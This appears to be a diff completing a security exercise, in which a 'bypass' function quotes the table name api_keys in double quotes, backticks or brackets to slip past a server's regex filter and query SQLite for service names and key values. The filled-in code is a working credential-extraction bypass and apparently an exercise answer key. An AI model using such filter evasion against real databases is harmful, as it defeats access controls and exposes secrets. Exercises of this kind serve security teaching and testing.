@@ -60,7 +60,22 @@ def bypass(url: str) -> None:
     # The secure server blocks the obvious version — find the form its check
     # misses but SQLite still runs (think about how the regex matches a table
     # name, and what SQLite accepts as an equivalent way to write one).
-    raise NotImplementedError("write your bypass, then print the credential")
+
+    # --- my work on workaround keys ----
+    table = '"api_keys"'
+    # or, equivalently,
+    #table = "`api_keys`"
+    #table = "[api_keys]"
+
+    outcome = (call(url,
+            "db_query", 
+            sql=f"SELECT service, key_name, key_value FROM {table}"))
+
+    if "error" not in outcome:
+        print("SUCCESS!!:\n", outcome)
+    else: 
+        print(outcome)
+    
     # ========================================================================
 
 
